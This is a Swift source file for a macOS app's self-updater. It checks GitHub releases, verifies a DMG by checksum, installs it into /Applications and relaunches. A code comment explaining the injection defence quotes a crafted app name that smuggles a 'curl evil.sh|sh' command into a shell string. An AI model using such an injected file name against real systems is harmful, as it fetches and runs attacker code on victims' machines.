// ToshLLM - run LLMs locally on Intel Macs with AMD GPUs
// Copyright (C) 2026 Engelbert Delgado <engeldlgado@gmail.com>
// SPDX-License-Identifier: GPL-3.0-or-later

import Foundation
import AppKit
import SwiftUI

struct UpdateError: LocalizedError {
    let message: String
    var errorDescription: String? { message }
}

struct ReleaseNote: Identifiable {
    let version: String
    let body: String
    var id: String { version }
}

/// Checks GitHub Releases for a newer published version and installs it:
/// verified download, mount, copy into /Applications and relaunch.
@MainActor
final class UpdateChecker: ObservableObject {
    @Published var latestVersion: String?
    @Published var releaseURL: URL?
    @Published var checking = false
    @Published var installing = false
    @Published var installError: String?
    /// Why the last check could not complete. Non-nil means "unknown", not
    /// "up to date", so the UI can say so instead of showing a green badge.
    @Published var checkError: String?

    private var dmgURL: URL?
    private var checksumsURL: URL?
    private var periodicTask: Task<Void, Never>?

    static let releasesAPI = "https://api.github.com/repos/engeldlgado/toshllm/releases/latest"

    /// Re-checks every hour while the app stays open, for people who never
    /// relaunch. Silent: it only lights up the existing update badge.
    func startPeriodicChecks(interval: TimeInterval = 3600) {
        guard periodicTask == nil else { return }
        periodicTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(interval * 1_000_000_000))
                guard !Task.isCancelled else { return }
                let enabled = UserDefaults.standard.object(forKey: SettingsKeys.updateAutoCheck) == nil
                    || UserDefaults.standard.bool(forKey: SettingsKeys.updateAutoCheck)
                if enabled { await self?.check() }
            }
        }
    }

    func check() async {
        guard !checking else { return }
        checking = true
        defer { checking = false }

        // The three failure modes are reported apart: "no update" and "could not
        // ask" look identical otherwise, and a broken check used to read as
        // "you are on the latest version".
        guard let url = URL(string: Self.releasesAPI) else {
            return failCheck("URL de consulta inválido / invalid check URL")
        }
        let data: Data, response: URLResponse
        do {
            (data, response) = try await NetworkManager.session.data(from: url)
        } catch {
            AppLog.updates.error("update check request failed: \(error.localizedDescription, privacy: .public)")
            return failCheck("No se pudo contactar con GitHub / could not reach GitHub: \(error.localizedDescription)")
        }
        let status = (response as? HTTPURLResponse)?.statusCode ?? 0
        guard status == 200 else {
            AppLog.updates.error("update check returned HTTP \(status)")
            // 403/429 are GitHub's rate limit, the usual cause here.
            return failCheck(status == 403 || status == 429
                ? "GitHub limitó las consultas; reintenta más tarde / GitHub rate-limited the check, try again later"
                : "GitHub respondió HTTP \(status) / GitHub answered HTTP \(status)")
        }
        let obj: [String: Any]
        do {
            guard let parsed = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
                AppLog.updates.error("update check payload was not a JSON object")
                return failCheck("Respuesta inesperada de GitHub / unexpected reply from GitHub")
            }
            obj = parsed
        } catch {
            AppLog.updates.error("update check payload unreadable: \(error.localizedDescription, privacy: .public)")
            return failCheck("Respuesta ilegible de GitHub / unreadable reply from GitHub")
        }
        guard let tag = obj["tag_name"] as? String else {
            AppLog.updates.error("update check payload has no tag_name")
            return failCheck("Respuesta sin número de versión / reply carried no version")
        }
        checkError = nil

        let remote = tag.hasPrefix("v") ? String(tag.dropFirst()) : tag
        if Self.isVersion(remote, newerThan: AppInfo.version) {
            latestVersion = remote
            releaseURL = (obj["html_url"] as? String).flatMap(URL.init(string:))
            if let assets = obj["assets"] as? [[String: Any]] {
                // A release carries both DMGs (AVX2 + no-AVX2, suffix "-noavx2").
                // Each build stays on its own channel: pick the asset matching this
                // bundle's variant so a no-AVX2 install never grabs an AVX2 DMG.
                for asset in assets {
                    guard let name = asset["name"] as? String,
                          let urlString = asset["browser_download_url"] as? String,
                          let url = URL(string: urlString) else { continue }
                    if name.hasSuffix(".dmg"),
                       name.contains("-noavx2") == AppInfo.isNoAVX2 { dmgURL = url }
                    if name == "checksums.txt" { checksumsURL = url }
                }
            }
        }
    }

    /// Records a failed check. `latestVersion` is left alone so a previous
    /// successful result stays visible; only the error surfaces.
    private func failCheck(_ message: String) {
        checkError = message
    }

    /// Downloads the release DMG to ~/Downloads, verifies it against the
    /// published checksums, installs the app into place and relaunches it.
    func downloadAndInstall() async {
        guard !installing else { return }
        // The DMG asset may not have been uploaded yet when the release was
        // first detected (CI uploads it after creating the release); refresh
        // before giving up and sending the user to the website.
        if dmgURL == nil { await check() }
        guard let dmgURL else {
            if let releaseURL { NSWorkspace.shared.open(releaseURL) }
            return
        }
        installing = true
        installError = nil
        defer { installing = false }

        do {
            let (temp, _) = try await NetworkManager.session.download(from: dmgURL)
            let downloads = FileManager.default.urls(for: .downloadsDirectory, in: .userDomainMask)[0]
            let dest = downloads.appendingPathComponent(dmgURL.lastPathComponent)
            try? FileManager.default.removeItem(at: dest)
            try FileManager.default.moveItem(at: temp, to: dest)

            // A checksum was published, so failing to obtain or apply one is a failure — not
            // a licence to install. This chain used to end silently: a 404, a rate
            // limit, a network blip or a filename the listing did not mention all
            // meant the comparison never happened and the install proceeded as if
            // it had passed. The listing and the image come from the same channel,
            // so it only ever caught transmission damage — but it was the only
            // check there was, and it disappeared exactly when the network was
            // already misbehaving.
            var verified = false
            if let checksumsURL {
                guard let (data, _) = try? await NetworkManager.session.data(from: checksumsURL),
                      let listing = String(data: data, encoding: .utf8),
                      let expected = listing.split(separator: "\n")
                          .first(where: { $0.contains(dmgURL.lastPathComponent) })?
                          .split(separator: " ").first.map(String.init)
                else {
                    try? FileManager.default.removeItem(at: dest)
                    installError = "No se pudo verificar la descarga: falta el checksum o no se pudo leer / could not verify the download: the checksum is missing or unreadable"
                    return
                }
                let actual = await Task.detached(priority: .userInitiated) {
                    FileHash.sha256(of: dest)
                }.value
                guard let actual else {
                    try? FileManager.default.removeItem(at: dest)
                    installError = "No se pudo verificar la descarga: no se pudo leer el archivo / could not verify the download: the file could not be read"
                    return
                }
                if expected.lowercased() != actual.lowercased() {
                    try? FileManager.default.removeItem(at: dest)
                    installError = "Checksum no coincide: descarga descartada / checksum mismatch: download discarded"
                    return
                }
                verified = true
            }

            let installed = try await Task.detached { try Self.install(dmgAt: dest, verified: verified) }.value
            // Installed OK: drop the downloaded DMG so it doesn't pile up in Downloads.
            // Any failure above leaves it in place (the catch keeps it for retry/inspection).
            try? FileManager.default.removeItem(at: dest)
            relaunch(installed)
        } catch {
            installError = error.localizedDescription
        }
    }

    /// Mounts the DMG, copies the app bundle into place (the running bundle's
    /// location when it lives in /Applications, /Applications otherwise) and
    /// unmounts. The old copy is moved aside first so the running process is
    /// never half-overwritten, and restored if the copy fails.
    /// - Parameter verified: whether the image's checksum was actually compared
    ///   against a published one. A release that publishes no checksum file is not
    ///   rejected — that would mean no update could ever install — but the bundle
    ///   then keeps its quarantine attribute, so Gatekeeper still asks about code
    ///   the app never checked.
    nonisolated private static func install(dmgAt dmg: URL, verified: Bool) throws -> URL {
        let plist = try run("/usr/bin/hdiutil", ["attach", dmg.path, "-nobrowse", "-readonly", "-plist"])
        guard let data = plist.data(using: .utf8),
              let obj = try? PropertyListSerialization.propertyList(from: data, format: nil) as? [String: Any],
              let entities = obj["system-entities"] as? [[String: Any]],
              let mount = entities.compactMap({ $0["mount-point"] as? String }).first else {
            throw UpdateError(message: "No se pudo montar el DMG / could not mount the DMG")
        }
        defer { _ = try? run("/usr/bin/hdiutil", ["detach", mount, "-force"]) }

        let fm = FileManager.default
        guard let appName = try fm.contentsOfDirectory(atPath: mount).first(where: { $0.hasSuffix(".app") }) else {
            throw UpdateError(message: "El DMG no contiene una app / the DMG contains no app")
        }
        let source = mount + "/" + appName

        let bundle = Bundle.main.bundleURL
        let target = bundle.path.hasPrefix("/Applications/")
            ? bundle
            : URL(fileURLWithPath: "/Applications").appendingPathComponent(appName)

        if fm.fileExists(atPath: target.path) {
            let aside = target.deletingPathExtension().appendingPathExtension("old.app")
            try? fm.removeItem(at: aside)
            try fm.moveItem(at: target, to: aside)
            do {
                try copy(source: source, target: target, verified: verified)
            } catch {
                try? fm.removeItem(at: target)
                try? fm.moveItem(at: aside, to: target)
                throw error
            }
            try? fm.removeItem(at: aside)
        } else {
            try copy(source: source, target: target, verified: verified)
        }
        return target
    }

    nonisolated private static func copy(source: String, target: URL, verified: Bool) throws {
        _ = try run("/usr/bin/ditto", [source, target.path])
        // The app's own downloads are not quarantined, but the attribute is
        // stripped so Gatekeeper does not flag the copy.
        //
        // This removes the one signal that the bundle came from elsewhere, so it
        // is conditional on having compared a checksum: when the release published
        // none, the attribute is left in place and Gatekeeper still asks the user
        // about a bundle the app could not check. The stripping is not a
        // substitute for the checksum either way — same channel, no signature.
        guard verified else { return }
        _ = try? run("/usr/bin/xattr", ["-dr", "com.apple.quarantine", target.path])
    }

    nonisolated private static func run(_ tool: String, _ args: [String]) throws -> String {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: tool)
        p.arguments = args
        let pipe = Pipe()
        p.standardOutput = pipe
        p.standardError = pipe
        try p.run()
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        p.waitUntilExit()
        guard p.terminationStatus == 0 else {
            let output = String(data: data, encoding: .utf8) ?? ""
            throw UpdateError(message: URL(fileURLWithPath: tool).lastPathComponent + ": "
                + (output.isEmpty ? "error \(p.terminationStatus)" : String(output.suffix(300))))
        }
        return String(data: data, encoding: .utf8) ?? ""
    }

    /// Launches the freshly installed copy and quits this one. The engine is
    /// stopped by applicationWillTerminate on the way out.
    private func relaunch(_ url: URL) {
        // Two processes instead of `/bin/sh -c`. The app's name inside the image
        // is whatever that image chose to call it, and an entry named
        // `x"; curl evil.sh|sh;"#.app` closed the quotes and ran as a command.
        // Passing the path as an argument leaves nothing to escape.
        let pause = Process()
        pause.executableURL = URL(fileURLWithPath: "/bin/sleep")
        pause.arguments = ["1"]
        try? pause.run()
        let open = Process()
        open.executableURL = URL(fileURLWithPath: "/usr/bin/open")
        open.arguments = [url.path]
        try? open.run()
        NSApp.terminate(nil)
    }

    // MARK: release notes

    @Published var releaseNotes: [ReleaseNote]?
    @Published var loadingNotes = false

    /// Notes from the running version up to the newest release; when already
    /// up to date, just the running version's notes.
    func fetchReleaseNotes() async {
        guard !loadingNotes else { return }
        loadingNotes = true
        defer { loadingNotes = false }
        guard let url = URL(string: "https://api.github.com/repos/engeldlgado/toshllm/releases?per_page=30"),
              let (data, response) = try? await NetworkManager.session.data(from: url),
              (response as? HTTPURLResponse)?.statusCode == 200,
              let list = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] else { return }
        let all = list.compactMap { obj -> (String, String)? in
            guard let tag = obj["tag_name"] as? String else { return nil }
            let version = tag.hasPrefix("v") ? String(tag.dropFirst()) : tag
            return (version, obj["body"] as? String ?? "")
        }
        releaseNotes = Self.notesToShow(all: all, current: AppInfo.version)
            .map { ReleaseNote(version: $0.0, body: $0.1) }
    }

    nonisolated static func notesToShow(all: [(String, String)], current: String) -> [(String, String)] {
        let newer = all.filter { isVersion($0.0, newerThan: current) }
            .sorted { isVersion($0.0, newerThan: $1.0) }
        if !newer.isEmpty { return newer }
        return all.filter { $0.0 == current }
    }

    /// Numeric per-component comparison (0.81.1 < 0.82 < 1.0).
    nonisolated static func isVersion(_ a: String, newerThan b: String) -> Bool {
        let pa = a.split(separator: ".").map { Int($0) ?? 0 }
        let pb = b.split(separator: ".").map { Int($0) ?? 0 }
        for i in 0..<max(pa.count, pb.count) {
            let x = i < pa.count ? pa[i] : 0
            let y = i < pb.count ? pb[i] : 0
            if x != y { return x > y }
        }
        return false
    }
}

/// Popup with the release notes covered by `fetchReleaseNotes`.
struct ReleaseNotesPopover: View {
    @EnvironmentObject var updates: UpdateChecker
    @EnvironmentObject var loc: Localizer

    var body: some View {
        VStack(alignment: .leading, spacing: 10) {
            Label(loc.t("Notas de la versión", "Release notes"), systemImage: "doc.text")
                .font(.headline)
            if updates.loadingNotes {
                HStack {
                    Spacer()
                    ProgressView().controlSize(.small)
                    Spacer()
                }
                .frame(minHeight: 80)
            } else if let notes = updates.releaseNotes, !notes.isEmpty {
                ScrollView {
                    VStack(alignment: .leading, spacing: 14) {
                        ForEach(notes) { note in
                            VStack(alignment: .leading, spacing: 6) {
                                HStack(spacing: 6) {
                                    Text("v\(note.version)").font(.subheadline.weight(.semibold))
                                    if note.version == AppInfo.version {
                                        Text(loc.t("actual", "current"))
                                            .font(.caption2)
                                            .padding(.horizontal, 6).padding(.vertical, 1)
                                            .background(.quaternary, in: Capsule())
                                    }
                                }
                                RichText(text: note.body)
                                    .font(.callout)
                            }
                            if note.id != notes.last?.id { Divider() }
                        }
                    }
                    .padding(.trailing, 6)
                }
                .frame(maxHeight: 420)
            } else {
                Text(loc.t("No se pudieron cargar las notas.", "Could not load the notes."))
                    .font(.callout).foregroundStyle(.secondary)
                    .frame(minHeight: 60)
            }
            Divider()
            Button(loc.t("Ver en GitHub", "View on GitHub")) {
                let tag = updates.releaseNotes?.first.map { "v\($0.version)" } ?? "v\(AppInfo.version)"
                NSWorkspace.shared.open(URL(string: "https://github.com/engeldlgado/toshllm/releases/tag/\(tag)")!)
            }
            .buttonStyle(.link).font(.caption)
        }
        .padding(14)
        .frame(width: 480)
        .task { await updates.fetchReleaseNotes() }
    }
}
